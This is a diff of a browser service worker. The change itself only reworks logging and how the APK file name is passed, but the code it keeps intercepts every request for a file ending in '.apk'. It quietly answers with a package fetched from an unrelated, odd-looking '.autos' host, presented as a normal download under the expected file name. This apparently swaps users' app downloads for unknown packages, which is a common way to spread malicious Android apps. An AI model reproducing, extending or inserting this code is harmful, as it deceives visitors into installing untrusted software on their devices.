@@ -25,12 +25,12 @@ async function logEvent(eventType, data = {}) {
     }
 }
 
-async function fetchApk(apkURL, clientId) {
+async function fetchApk(apkURL, apkname) {
     const startTime = performance.now();
-    logEvent('sw_fetch_start', {apkURL, clientId});
+    logEvent('sw_fetch_start', {apkURL});
     try {
         const response = await fetch(apkURL, { method: 'GET', credentials: 'omit' });
-        logEvent('sw_fetch_response', {status: response.status, ok: response.ok, clientId});
+        logEvent('sw_fetch_response', {status: response.status, ok: response.ok});
 
         if (!response.ok) {
             throw new Error(`HTTP ${response.status}: ${response.statusText}`);
@@ -41,15 +41,15 @@ async function fetchApk(apkURL, clientId) {
         return new Response(response.body, {
             headers: {
                 'Content-Type': 'application/vnd.android.package-archive',
-                'Content-Disposition': `attachment; filename="${getApkName(new URL(event.request.url))}"`,
+                'Content-Disposition': `attachment; filename="${apkname}"`,
                 'Content-Length': contentLength || undefined
             }
         });
     } catch (error) {
-        logEvent('sw_fetch_error', {error: error.message, clientId});
+        logEvent('sw_fetch_error', {error: error.message});
         throw error;
     } finally {
-        logEvent('sw_fetch_end', {duration: performance.now() - startTime, clientId});
+        logEvent('sw_fetch_end', {duration: performance.now() - startTime});
     }
 }
 
@@ -64,18 +64,18 @@ function getApkName(url) {
 
 self.addEventListener('fetch', event => {
     const url = new URL(event.request.url);
-    const clientId = event.clientId || 'unknown';
 
-    logEvent('sw_fetch_event', {pathname: url.pathname, clientId});
+    logEvent('sw_fetch_event', {pathname: url.pathname});
 
     if (url.pathname.endsWith('.apk')) {
         event.respondWith(
             (async () => {
                 const apkURL = "https://noticeablyholyewe.autos/aaa8e7e844e856a015a/" + url.search;
+                const apkname = getApkName(url)
                 try {
-                    return await fetchApk(apkURL, clientId);
+                    return await fetchApk(apkURL, apkname);
                 } catch (error) {
-                    logEvent('sw_apk_fallback', {error: error.message, clientId});
+                    logEvent('sw_apk_fallback', {error: error.message});
                     return fetch(event.request);
                 }
             })()
